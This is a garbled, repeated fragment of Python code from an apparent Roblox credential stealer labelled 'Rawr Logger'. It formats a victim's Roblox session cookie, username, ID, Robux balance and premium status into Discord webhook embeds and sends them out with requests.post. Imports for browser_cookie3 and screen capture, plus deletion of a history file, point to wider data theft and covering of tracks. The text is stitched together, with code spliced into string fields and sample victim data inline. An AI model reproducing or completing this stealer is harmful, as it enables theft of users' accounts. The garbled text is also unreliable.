        ...
        if info.status_code == 200:
          ...
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    ...
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {https://tr.rbxcdn.com/30DAY-Avatar-01AC45DE8D4DF3B4F03A8E69F3C50910-Png/352/352/Avatar/Webp/noFilter}```",                       
                    "footer": {
        ...
        if info.status_code == 200:
          ...
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    ...
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {import os,requests,socket,threading,platform,json,psutil,sys,win32api
import browser_cookie3
import cv2
import re, uuid
from PIL import ImageGrab
        ...
        if info.status_code == 200:
          ...
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    ...
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {jay_rat3}``` ```Roblox Id Of The Account Is: {4984735641}``` ```Roblox Robux Balance Of The Account Is: {0}```  ```Roblox Premium Of The Account Is: {notpremium}```  ```Roblox Thumnail Of The Account Is : {https://tr.rbxcdn.com/30DAY-Avatar-01AC45DE8D4DF3B4F03A8E69F3C50910-Png/352/352/Avatar/Webp/noFilter}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
...
try:
    ...
    os.remove('history.txt')
     ...
     requests.post(webhook, json=embeded)}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]
